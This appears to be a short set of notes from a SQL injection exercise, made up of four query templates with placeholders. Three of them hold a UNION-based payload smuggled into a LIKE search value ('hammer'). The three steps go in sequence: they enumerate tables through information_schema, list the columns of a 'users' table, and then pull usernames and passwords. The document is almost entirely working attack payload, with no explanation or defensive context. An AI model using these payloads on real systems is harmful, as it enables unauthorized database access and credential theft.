SELECT ? FROM ? WHERE ? LIKE '%------%'


SELECT ? FROM ? WHERE ? LIKE 'hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA,'3'FROM information_schema.tables);--%'

SELECT ? FROM ? WHERE ? LIKE 'hammer' UNION (SELECT COLUMN_NAME, '2','3'FROM information_schema.columns WHERE TABLE_NAME = 'users');--%'

SELECT ? FROM ? WHERE ? LIKE 'hammer' UNION (SELECT username,password,' ' FROM users);--%'
